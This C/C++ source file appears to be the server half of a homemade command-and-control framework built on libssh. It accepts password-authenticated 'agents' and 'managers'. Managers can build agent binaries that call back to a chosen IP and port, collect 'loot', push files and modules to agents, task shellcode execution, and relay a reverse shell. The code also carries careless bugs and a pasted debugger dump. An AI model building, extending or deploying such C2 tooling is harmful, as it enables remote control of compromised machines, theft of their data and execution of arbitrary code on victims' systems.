#include "server.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif

#ifndef KEYS_FOLDER
#ifdef _WIN32
#define KEYS_FOLDER
#else
#define KEYS_FOLDER "/etc/ssh/"
#endif
#endif


#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
    SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
    {
        .name  = "port",
        .key   = 'p',
        .arg   = "PORT",
        .flags = 0,
        .doc   = "Set the port to bind.",
        .group = 0
    },
    {
        .name  = "hostkey",
        .key   = 'k',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the host key.",
        .group = 0
    },
    {
        .name  = "dsakey",
        .key   = 'd',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the dsa key.",
        .group = 0
    },
    {
        .name  = "rsakey",
        .key   = 'r',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the rsa key.",
        .group = 0
    },
    {
        .name  = "verbose",
        .key   = 'v',
        .arg   = NULL,
        .flags = 0,
        .doc   = "Get verbose output.",
        .group = 0
    },
    {
        .name = "agent",
        .key = 'a',
        .arg = "IP:PORT",
        .flags = 0,
        .doc = "Compile an agent which will connect to IP over PORT",
        .group = 0
    },
    {
        .name = "authenticate",
        .key = 'i',
        .arg = "ID:PASS",
        .flags = 0,
        .doc = "Add agent information to the server database",
        .group = 0
    },
    {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
    ssh_bind sshbind = (ssh_bind) state->input;
    char *ip;
    char *port;
    char *pass;
    char *id;
    int dbg = 0;
    int halt = 0;
    char buff[256];
    AgentInformationHandler *handler = new AgentInformationHandler();
  
    switch (key) {
        case 'p':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
            break;
        case 'd':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
            break;
        case 'k':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
            break;
        case 'r':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
            break;
        case 'v':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
            break;
        case 'a':
            halt = 1;
            port = strchr(arg, ':') + 1;
            if(port == NULL){
                printf("Improper format: needs to be IP:PORT\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            ip = misc_substring(arg, dbg, strlen(arg));
        
            handler->compile(ip, port);
            free(ip);
            break;
        case 'i':
            halt = 1;
            pass = strchr(arg, ':') + 1;
            if(pass == NULL){
                printf("Improper format: needs to be ID:PASSWORD\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            id = misc_substring(arg, dbg, strlen(arg));

            AgentInformationHandler::register_agent(id, pass);
            sprintf(buff, "Registered agent with %s and %s\n", id, pass);
            free(id);
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num >= 1) {
            /* Too many arguments. */
                argp_usage (state);
            }
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
            break;
        case ARGP_KEY_END:
            if (state->arg_num < 1) {
                /* Not enough arguments. */
                delete handler;
                if(!halt)
                    argp_usage (state);
                else exit(0);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */

/*Global variables and data structures*/
pthread_t thread_array[MAX_CONN];

ConnectionInstance::ConnectionInstance(){
    this->logger = new Log();
    this->list = new List();

    // seed random number generator
    srand(time(NULL));

	// gets current file path, so data will be written to correct folder regardless of where execution is called
	char result[4096];
	memset(result, 0, sizeof(result));
	readlink( "/proc/self/exe", result, 4096);

	char dir[4096];
	memset(dir, 0, sizeof(dir));
	char* last;
	last = strrchr(result, '/');

	unsigned long index = last - result;
	strncpy(dir, result, index);
	
	int ret = chdir(dir);


	if(ret < 0){
		perror("Failed to change directory");
		exit(-1);
	}


    struct stat st = {0};
    umask(0);

    if (stat("agents", &st) == -1) {
        mkdir("agents", 0755);
        printf("Server: initialized directory 'agents'\n");
    }

    if (stat("out", &st) == -1) {
        mkdir("out", 0755);
        printf("Server: initialized directory 'out'\n");
    }

    if (stat("modules", &st) == -1) {
        mkdir("modules", 0755);
        printf("Server: initialized directory 'modules'\n");
    }

    if (stat(DATA_FILE, &st) == -1) {
        int fd2 = open(DATA_FILE, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
        printf("Server: initialized agent authentication file\n");
        close(fd2);
    }
}

ConnectionInstance::~ConnectionInstance(){
    return;
}

void ConnectionInstance::get_info(class ServerTransport *transport, char *ptr){
    return;
}

/*Handler for manager connections and flow*/
void ConnectionInstance::manager_handler(class ServerTransport *transport){
    pClientNode node = transport->get_node();
    char resp[2048];

    int operation;
    int rc = 0;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char buff[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbuffer[8];
    char filename[2048];
            

    while (!quitting)
    {
        ptr = resp;
        operation = -1;
        rc = 0;
        dat_ptr = NULL;

        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, sizeof(resp));
        memset(logbuff, 0, sizeof(logbuff));
        
        rc = ssh_channel_read(node->data->chan, resp, sizeof(resp), 0);
        if (rc == SSH_ERROR)
        {
            sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
            this->logger->log(logbuff);
            return;
        }
        
        char tmpbf[3] = {0,0,0};
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        sprintf(logbuff, "Manager %s: Operation caught: %d\n", node->data->id, operation);
        this->logger->log(logbuff);

        if(*ptr == '\0'){
            sprintf(logbuff, "Manager %s: Caught illegal operation option: NULL\n", node->data->id);
            this->logger->log(logbuff);
            ssh_channel_write(node->data->chan, "er", 3);
            quitting = 1;
            continue;
        }

        switch (operation)
        {
        case MANAG_EXIT:
            this->list->remove_node(node);
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            transport->get_loot(ptr);
            break;

        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

        case MANAG_REQ_RVSH:
            printf("Manager shell command caught\n");
            break;

        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            
            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");
            break;

        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
            rc = ssh_channel_write(node->data->chan, "ok", 2);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
                this->logger->log(logbuff);
                return;
            }
            break;

        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
            rc = ssh_channel_write(node->data->chan, "ok", 2);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
                this->logger->log(logbuff);
                return;
            }
            break;

        case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            transport->make_agent(dat_ptr, d_ptr);
            dat_ptr = NULL;
            transport->upload_file("out/client.out", 0);
            break;

        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");
            break;

        case MANAG_GET_INFO:
            this->get_info(transport, ptr);
            break;

        case MANAG_REQ_PORTS:
            this->get_ports(transport, ptr);
            break;

        default:
            sprintf(logbuff, "Manager %s: Unknown operation value '%d'\n", node->data->id, operation); 
            this->logger->log(logbuff);
            rc = ssh_channel_write(node->data->chan, "un", 3);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
                this->logger->log(logbuff);
                return;
            }
            break;
        }
    }
    
}

void ConnectionInstance::get_ports(class ServerTransport* transport, char *ptr){

}

/*Handles reverse shell connections and forwarding*/
void ConnectionInstance::reverse_shell(class ServerTransport *transport){
    int port = (rand() % (65535-2048))+ 2048;
    pClientNode node = transport->get_node();
    char agent_buffer[BUFSIZ];
    char manager_buffer[BUFSIZ];
    char logbuff[BUFSIZ];
    int server_fd, manager, rc; 
    struct sockaddr_in address; 
    int opt = 1; 
    int addrlen = sizeof(address); 

    memset(agent_buffer, 0, sizeof(agent_buffer));
    memset(manager_buffer, 0, sizeof(manager_buffer));
    memset(logbuff, 0, sizeof(logbuff));
       
    // Creating socket file descriptor 
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) 
    { 
        perror("socket failed"); 
        return; 
    } 
       
    // Forcefully attaching socket to the port 8080 
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) 
    { 
        perror("setsockopt"); 
        return; 
    } 
    address.sin_family = AF_INET; 
    address.sin_addr.s_addr = INADDR_ANY; 
    address.sin_port = htons(port); 
       
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0) 
    { 
        perror("bind failed"); 
        return; 
    }



    if (listen(server_fd, 3) < 0) 
    { 
        perror("listen"); 
        return; 
    } 
    if ((manager = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0) 
    { 
        perror("accept"); 
        exit(EXIT_FAILURE); 
    } 
    while (manager && ssh_channel_is_open(node->data->chan))
    {
        // Get stuff from the agent
        while(rc != 0){
            rc = ssh_channel_read(node->data->chan, agent_buffer, sizeof(agent_buffer), 0);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Client %s: Failed to forward data: %s\n", node->data->id, ssh_get_error(node->data->session));
                this->logger->log(logbuff);
                return;
            }
            // send info to manager socket
            write(manager, agent_buffer, rc);
            memset(agent_buffer, 0, sizeof(agent_buffer));
        }
        // Get stuff from the manager socket
        while(rc != 0){
            rc = read(manager, manager_buffer, sizeof(manager_buffer));
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to forward data: %s\n", node->data->id, ssh_get_error(node->data->session));
                this->logger->log(logbuff);
                return;
            }
            // send info to manager socket
            ssh_channel_write(node->data->chan, manager_buffer, sizeof(manager_buffer));
            memset(manager_buffer, 0, sizeof(manager_buffer));
        }

        

        
    }
    printf("Someone disconnected...\n");
    
    return; 

}

/*Handler for agent connections and flow*/
void ConnectionInstance::agent_handler(class ServerTransport *transport){
    pClientNode node = transport->get_node();
    char resp[2048];
    
    int operation;
    int rc = 0;
    int quitting = 0;
    char buff[2048];
    char tmpbuffer[8];
    char *ptr = NULL;
    char filename[2048];
    char logbuff[BUFSIZ];
            
            
    while (!quitting)
    {
        ptr = resp;
        operation = -1;
        rc = 0;
        memset((void*)buff, 0, 2048);
        memset((void*)tmpbuffer, 0, 8);
        memset((void*)filename, 0, 2048);
        memset((void*)resp, 0, sizeof(resp));
        memset((void*)logbuff, 0, sizeof(logbuff));

        if (node == nullptr)
        {
            printf("NODE IS FUCKIN DED\n");
        }

        if(node->data == nullptr) printf("data died\n");
        

        if(node->data->chan == NULL){
            printf("dis broke\n");
        }
        if(resp == NULL){
            printf("da other ting broke\n");
        }
        
        // IT JUST FUCKIN DIEZ HERE
/*
   0x0000555555558e62 <+260>:   call   0x5555555571b0 <memset@plt>
   0x0000555555558e67 <+265>:   mov    rax,QWORD PTR [rbp-0x3830]
=> 0x0000555555558e6e <+272>:   mov    rax,QWORD PTR [rax+0x10]
   0x0000555555558e72 <+276>:   mov    rax,QWORD PTR [rax+0x18]
   0x0000555555558e76 <+280>:   lea    rsi,[rbp-0x3810]
   0x0000555555558e7d <+287>:   mov    ecx,0x0
   0x0000555555558e82 <+292>:   mov    edx,0x800
   0x0000555555558e87 <+297>:   mov    rdi,rax
   0x0000555555558e8a <+300>:   call   0x555555557260 <ssh_channel_read@plt>
*/
        rc = ssh_channel_read(node->data->chan, resp, sizeof(resp), 0);
        if (rc == SSH_ERROR)
        {
            sprintf(logbuff, "Client %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
            this->logger->log(logbuff);
            return;
        }
        
        printf("Requested tasking: %s\n", resp);
        char tmpbf[3] = {0,0,0};
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        sprintf(logbuff, "Client %s: Operation caught: %d\n", node->data->id, operation);
        this->logger->log(logbuff);

        if(*ptr == '\0'){
            sprintf(logbuff, "Client %s: Caught illegal operation option: NULL\n", node->data->id);
            this->logger->log(logbuff);
            ssh_channel_write(node->data->chan, "er", 3);
            quitting = 1;
            continue;
        }

        switch (operation)
        {
        case AGENT_EXIT:
            printf("Client %s: Client exiting...\n", node->data->id); 
            this->list->remove_node(node);
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
            transport->upload_file(buff, 0);
            break;

        case AGENT_UP_FILE:
            transport->download_file(ptr, 0, NULL);
            break;

        case AGENT_REV_SHELL:
            printf("Agent reverse shell caught\n");
            this->reverse_shell(transport);
            break;

        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
            transport->upload_file(buff, 1);
            break;

        default:
            sprintf(logbuff, "Client %s: Unknown operation value '%d'\n", node->data->id, operation); 
            this->logger->log(logbuff);
            ssh_channel_write(node->data->chan, "un", 3);
            break;
        }
    }
}


/*Initialized the connection and prepares data structures for handlers*/
void *ConnectionInstance::handle_connection(void *input){
    int auth=0;
    ssh_message message;
    char *name = NULL;
    ssh_session session = (ssh_session)input;
    
    do {
        message=ssh_message_get(session);
        if(!message)
            break;
        switch(ssh_message_type(message)){
            case SSH_REQUEST_AUTH:
                switch(ssh_message_subtype(message)){
                    case SSH_AUTH_METHOD_PASSWORD:
                        if(Authenticate::doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                            auth=1;
                            name = (char*)malloc(strlen(ssh_message_auth_user(message)));
                            memset(name, 0, strlen(ssh_message_auth_user(message)));
                            sprintf(name, "%s", ssh_message_auth_user(message));
                            ssh_message_auth_reply_success(message,0);
                            break;
                       	} else {
                            auth = 2;
                            ssh_message_reply_default(message);
                            break;
                        }
                    // not authenticated, send default message
                    case SSH_AUTH_METHOD_NONE:
                    default:
                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                        ssh_message_reply_default(message);
                        break;
                }
                break;
            default:
                ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (!auth);
    
    // Check if the client authenticated successfully
	if(auth != 1){
        printf("Server: Terminating connection\n");
        ssh_disconnect(session);
    }else {
        pClientDat pass = (pClientDat)malloc(sizeof(clientDat));
        pass->id = name;
        pass->session = session;
        pass->trans_id = rand();
            
        pClientNode node = (pClientNode)malloc(sizeof(*node));
        node->data = pass;
        node->nxt = NULL;
        node->prev = NULL;

        class ConnectionInstance *instance = new ConnectionInstance();
        class Log *logger = instance->get_logger();
        class List *list = instance->get_list();
        class ServerTransport *transport = new Ssh_Transport(logger, list, node);
        int handler = transport->determine_handler();
        printf("Called transport type parser\n");
        if (handler == AGENT_TYPE)
        {
            printf("Starting agent handler\n");
            instance->agent_handler(transport);
        } else if(handler == MANAG_TYPE)
        {
            printf("Starting manager handler\n");
            instance->manager_handler(transport);
        } else
        {
            printf("Woops got an unknown type: %d\n", handler);
        }
        
        
        
    }

    return NULL;
        
}

void ConnectionInstance::set_transport(class ServerTransport *transport){
    this->transport = transport;
}

class Log *ConnectionInstance::get_logger(){
    return this->logger;
}

class List *ConnectionInstance::get_list(){
    return this->list;
}


void print_clientDat(clientDat *str){
    printf("\n\nID: %s\n", str->id);
    printf("Session address: %p\n", &(str->session));
    printf("Transaction ID: %d\n", str->trans_id);
    printf("Channel address: %p\n", &(str->chan));
    printf("Type: %d\n\n\n", str->type);
}


int main(int argc, char **argv){
// TODO: UPDATE SIGHANDLERS TO MODERN STUFF

    // set up signal handlers
    //struct sigaction sigIntHandler;
	//struct sigaction sigTermHandler;


	//sigIntHandler.sa_handler = handleTerm;
   	//sigemptyset(&sigIntHandler.sa_mask);
   	//sigIntHandler.sa_flags = 0;

	//sigTermHandler.sa_handler = handleTerm;
	//sigemptyset(&sigTermHandler.sa_mask);
	//sigTermHandler.sa_flags = 0;

   	//sigaction(SIGINT, &sigIntHandler, NULL);
    //sigaction(SIGTERM, &sigTermHandler, NULL);
    
    // initialize variables
    ssh_session session;
    ssh_bind sshbind;
    int r;
    int opt = 1;
    int quitting = 0;
	int master_socket;
    int ctr = 0;
    pthread_t thread;
    class ConnectionInstance *server = new ConnectionInstance();
    
    if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("Server: Socket Failure");   
        exit(EXIT_FAILURE);   
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("Server: Setsockopt Failure");   
        exit(EXIT_FAILURE);   
    }



    sshbind=ssh_bind_new();
    session=ssh_new();

    ssh_options_set(session, SSH_OPTIONS_FD, &master_socket);
	
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
#ifdef HAVE_ARGP_H
    /*
     * Parse our arguments; every option seen by parse_opt will
     * be reflected in arguments.
     */
    argp_parse (&argp, argc, argv, 0, 0, sshbind);
#else
    (void) argc;
    (void) argv;
#endif

    // bind the listener to the port
    if(ssh_bind_listen(sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
        return 1;
    }
    printf("Server: Bound to listening port\n");
    
    // accept connections
    while (!quitting){
        session=ssh_new();

        r=ssh_bind_accept(sshbind,session);
	    printf("Server: Accepting connection\n");
        if(r==SSH_ERROR){
      	    printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
      	    return 1;
        }
        if (ssh_handle_key_exchange(session)) {
            printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
            return 1;
        }

        // pass connection to handler thread
        if(pthread_create(&thread, NULL, server->handle_connection, session)){
            printf("Error creating thread\n");
            ssh_disconnect(session);
            break;
        }
    
        thread_array[ctr] = thread;

        	
    }
        
        
    for (size_t i = 0; i < ctr; i++){
        if(pthread_join(thread_array[i], NULL)){
            printf("Failed to join thread at index %lu\n", i);
        }
    }

    ssh_bind_free(sshbind);
    ssh_finalize();

    printf("Server: Terminated successfully\n");
    return 0;
}
